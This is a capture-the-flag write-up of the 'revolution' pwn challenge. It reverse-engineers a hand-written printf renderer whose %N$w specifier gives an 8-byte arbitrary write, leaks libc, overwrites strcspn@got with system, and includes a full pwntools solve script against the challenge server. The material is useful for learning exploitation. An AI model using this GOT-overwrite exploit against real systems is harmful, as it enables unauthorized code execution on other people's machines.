# Print Print Revolution - writeup (pwn, custom fmtstr)

## What the task was

`revolution` is a "score printer" that repeatedly asks for a score-card template:

```text
score>
```

It renders each template with a **custom, hand-written printf-like** renderer. The binary is:

```text
No canary, No PIE, NX on, Partial RELRO
```

The important part is that the renderer implements a small set of format
specifiers, including a **write** one. That gives us an arbitrary-write
primitive with no heap tricks and no ROP.

---

## Reverse of the renderer

The renderer (`FUN_00401330`) walks the input buffer character by character.
The interesting specifiers are:

- `%N$p` → prints `arg[N]` as hex (a leak)
- `%N$s` → prints the string at `arg[N]`
- `%N$w` → `*(arg[N]) = arg[N+1]`  (8-byte arbitrary write)

The arguments are pulled from the stack relative to the caller's frame. By
probing with known markers in our buffer we can map the layout exactly:

```text
arg[6 + i] == buffer[i * 8]
```

So placing an 8-byte quantity at buffer offset `X` makes it available as
argument `6 + X/8`.

---

## Step 1: buffer layout

We will use `%12$w`, which writes `*(arg[12]) = arg[13]`.

Per the mapping:

```text
arg[12] = buffer[0x30] (offset 48)
arg[13] = buffer[0x38] (offset 56)
```

The format string must be at the very start of the buffer, because the
renderer stops parsing at the first `\0` byte (and our binary addresses
contain nulls).

So line 2 looks like:

```text
"%12$w"  +  "A" * (48 - 5)  +  p64(target)  +  p64(value)
```

- `"%12$w"` is parsed first → the write happens.
- The padding to offset 48 is literal output.
- `target` sits at buffer[48] → `arg[12]`.
- `value`   sits at buffer[56] → `arg[13]`.

When the parser later reaches the null bytes inside `target`, it stops - but
the write already happened.

---

## Step 2: target & value

`system` is **not** imported, so there is no `system@plt`/GOT and no obvious
winner. Instead we:

1. Leak a libc pointer.
2. Overwrite the GOT entry of a function main() calls on every input line.

main() calls, in order:

```text
read() -> strcspn(input, "\n") -> renderer -> write(newline)
```

If we overwrite **`strcspn@got` (0x404010)** with `system`, then on the *next*
line the program does:

```c
strcspn(input, "\n")   // == system(input)
```

So everything we type after the overwrite is executed as a shell command.

---

## Step 3: leak libc

Scanning the arguments with `%N$p`, most values are small or point into the
binary / loader. One stands out:

```python
%73$p  ->  libc + 0x2a1ca
```

That is a **code pointer**: the saved return address from `main()` into
libc's startup code (between `__libc_init_first` and `__libc_start_main` in
the provided glibc 2.39; `readelf` on the shipped libc confirms the `.text`
layout). It is stable across runs, so:

```python
libc   = leak - 0x2a1ca
system = libc + 0x58740
```

---

## Step 4: put it together

```python
# line 1: leak
%73$p

# line 2: write system -> strcspn@got
"%12$w" + "A"*43 + p64(0x404010) + p64(system)

# line 3: execute
cat flag.txt
```

`line 3` is processed by the (now-overwritten) `strcspn`, i.e. `system("cat flag.txt\n")`, and the output (including the flag) is printed.

---

## What I tried first (dead ends)

1. **Looking for a `system` import or a win function** - there is none; `system` is not imported and there is no `win`.
2. **Classic `%n`-style write to `puts@got` etc.** - the character-set handling is custom; the reliable write is `%N$w`, not `%n`.
3. **Pinned the wrong libc pointer** - the `%N$p` scan showed several libc
   addresses, and my first anchor was `libc+0x2a380`. That is a real offset
   in this glibc 2.39 (`gnu_get_libc_version`, a function pointer), so it
   looked like a perfectly good base - but subtracting the *code* offset
   `0x2a1ca` from it shifts the base by `0x2a380 - 0x2a1ca = 0x1b6`. Every
   address computed from that base is off by `0x1b6`, so the address written
   into `strcspn@got` was not `system` but a spot 0x1b6 bytes off, and the
   next input line died with `SIGSEGV`. The correct anchor is the saved
   return address at `libc+0x2a1ca`, verified against `/proc/<pid>/maps`
   (`readelf -sW` on the shipped libc then confirms `system` at `0x58740`).
4. **Overwriting `write@got` / `strlen@got`** - technically possible, but `strcspn@got` is the cleanest trigger because main() calls it with our own input as the argument.

The only real "gotcha" was nailing the libc-leak offset. Everything else is a single write + a normal command line.

---

## Final `solve.py`

```python
#!/usr/bin/env python3
import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "chal.<...>.games"
PORT = 26002

STRCSPN_GOT = 0x404010
LIBC_LEAK_OFF = 0x2A1CA
LIBC_SYSTEM = 0x58740


def main() -> int:
    r = remote(HOST, PORT)

    # leak libc via arg[73]
    r.recvuntil(b"score> ")
    r.sendline(b"%73$p")
    line = r.recvuntil(b"score> ", timeout=5)
    leak = int(re.search(rb"0x[0-9a-f]+", line).group(0), 16)
    libc = leak - LIBC_LEAK_OFF
    system = libc + LIBC_SYSTEM
    log.success(f"libc={libc:#x} system={system:#x}")

    # %12$w : *arg[12] = arg[13]  ->  *strcspn@got = system
    buf = b"%12$w" + b"A" * (48 - 5) + p64(STRCSPN_GOT) + p64(system)
    r.sendline(buf)
    r.recvuntil(b"score> ", timeout=5)

    # next line is run through strcspn == system
    r.sendline(b"cat flag.txt; ls")
    out = r.recvall(timeout=5)
    print(out.decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run with:

```bash
python3 solve.py
```

---

## Result

After the overwrite, the command line `cat flag.txt` is executed by the shell
and the flag is printed.

Flag: `sun{...}` (masked)

---

## One-paragraph version

`revolution` has no canary, no PIE and ships a hand-written printf. Its
`%N$w` specifier is an 8-byte write-what-where: `*(arg[N]) = arg[N+1]`, and the
arguments map directly onto our input buffer (`arg[6+i] = buffer[i*8]`). We leak
libc through `%73$p`, overwrite `strcspn@got` with `system`, and then every line
we type is executed as a command - so `cat flag.txt` prints the flag.

---

## Lessons learned

1. A hand-written "printf" with a write specifier is a full arbitrary-write
   primitive; always check for `%N$w`-style ops before reaching for ROP.
2. The format buffer doubling as an argument table (`arg[6+i] = buf[i*8]`)
   makes it very convenient to place both the target address and the value.
3. When the write and the format share a buffer, put the specifier first and
   the (null-containing) addresses after, so parsing finishes the write before
   hitting a `\0`.
4. Pick a GOT target that the program calls with attacker-controlled data
   (`strcspn` on our input) for a clean `-> system` transition.
5. Before subtracting an offset from a leak, know what the pointer actually
   is (saved return address vs. function/data pointer) and verify the base,
   e.g. with `/proc/<pid>/maps` - a 0x1b6 base error is invisible in the
   hexdump but breaks every address computed from it.